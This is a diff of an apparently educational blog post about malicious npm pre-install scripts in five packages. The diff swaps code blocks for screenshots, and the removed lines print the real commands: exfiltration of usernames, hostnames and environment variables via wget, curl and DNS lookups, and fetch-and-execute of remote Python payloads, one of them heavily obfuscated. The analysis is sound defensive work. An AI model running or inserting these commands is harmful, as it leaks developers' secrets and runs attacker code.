@@ -34,11 +34,9 @@ Let's see just how much of a bad idea install scripts can be, by looking at five
 
 `micro-username` is a package that has been live in the registry for about two days, in February 2023. While it was available, it published 28 versions, with descriptions ranging from `this is for micro-soft` to `Simple PoC package for testing for dependency confusion vulnerabilities.`
 
-The pre-install script for the package was:
+The pre-install script for the package attempted to silently exfiltrate data:
 
-```bash
-wget --quiet "https://curetosec.online/?user=$(whoami)&path=$(pwd)&hostname=$(hostname)"
-```
+![](https://cdn.hashnode.com/res/hashnode/image/upload/v1681558729399/981c32ce-b855-4017-a495-c9a038b1b446.png align="center")
 
 This script pings a URL that is constructed using several commands that expose private information about your development machine:
 
@@ -55,9 +53,7 @@ The `--quiet` option for `wget` is a command-line option that instructs `wget` t
 
 `@primeo/address` was live for four days in December 2021, and only had a single version, but with a very elaborate install script:
 
-```bash
-nslookup $(whoami).u.pkgio.com ; nslookup $(uname --nodename).h.pkgio.com ; curl -X POST -d @package.json -H 'X-BOT: nope' https://www.pkgio.com/.x773/package.json ; env > /tmp/.env ; curl -X POST -d @/tmp/.env -H 'X-BOT: nope' https://www.pkgio.com/.x773/env.json
-```
+![](https://cdn.hashnode.com/res/hashnode/image/upload/v1681558815197/c4e15c07-92ea-416a-915d-ca29abf77cb0.png align="center")
 
 1. `nslookup $(whoami).u.pkgio.com`: This command looks up the IP address associated with the hostname `$(whoami).u.pkgio.com` using the `nslookup` tool.
     
@@ -72,9 +68,7 @@ nslookup $(whoami).u.pkgio.com ; nslookup $(uname --nodename).h.pkgio.com ; curl
 
 `@ovh-ui/oui-checkbox` was live for about a week in June 2022 and seems to be part of a bug bounty program by French company Sekost. It tried to further evade detection by using DNS requests instead of HTTP:
 
-```bash
-dig `hostname|base64`-`whoami|base64`b.ovhouicheckbox.cak3eq2n01lh1hhcqapgtgd5jgwc17r3r.lupin.monster
-```
+![](https://cdn.hashnode.com/res/hashnode/image/upload/v1681558843551/14b16a20-071b-4347-840d-9aaec27f1a45.png align="center")
 
 When you run the `dig` command with a domain name, it sends a DNS query to a DNS server and retrieves the corresponding DNS records for that domain. This can be useful for troubleshooting DNS issues, verifying DNS configurations, or performing DNS reconnaissance.
 
@@ -90,15 +84,11 @@ In addition, malware can use `dig` to perform DNS tunneling, which is a techniqu
 
 Version 1.3.3 implemented a naive approach by using `wget` to download a Python script and save it to the user's home directory, as a hidden file, inconspicuously named `.vim.hint`:
 
-```bash
-wget 'http://121.196.214.81:8082/p.py' -O ~/.vim.hint;python ~/.vim.hint
-```
+![](https://cdn.hashnode.com/res/hashnode/image/upload/v1681558876362/5288a4d9-9118-4f7d-ac49-16fdbf13b933.png align="center")
 
 By version 1.3.4 though, the pre-install script got a bit smarter:
 
-```bash
-nohup python -c 'import urllib;exec urllib.urlopen("http://121.196.214.81:8083/p.py").read()' &
-```
+![](https://cdn.hashnode.com/res/hashnode/image/upload/v1681558910178/5b349762-adda-49cb-aacc-f6ed154bf1ef.png align="center")
 
 Here is a breakdown of what the command above does:
 
@@ -117,9 +107,7 @@ Here is a breakdown of what the command above does:
 
 `alicov` was live for about a month in 2018 and published 15 versions in total. It used a convoluted install script to mask its malicious intents:
 
-```bash
-python -c "(lambda __g, __contextlib: (lambda __mod: [(lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and ([True for __out[0] in [(lambda after: after())]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((eval(compile(u('http://10.209.61.37:8044/aa').read(), '<string>', 'exec'), None, __g), (lambda __after: __after()))[1])]][0]})())))([None]) for __g['u'] in [(__mod.urlopen)]][0])(__import__('urllib', __g, __g, ('urlopen',), 0)))(globals(), __import__('contextlib'));print 'this is a fake package\\nif you want to get the right one, DO NOT USE NPM'"
-```
+![](https://cdn.hashnode.com/res/hashnode/image/upload/v1681558950420/34510000-9bbd-4aec-83dd-9102675fbf21.png align="center")
 
 This Python script defines a lambda function that performs a malicious action, specifically requesting a potentially dangerous URL. The lambda function is defined using a nested `__contextlib.nested()` function, which creates a context manager to handle the cleanup of resources.
 
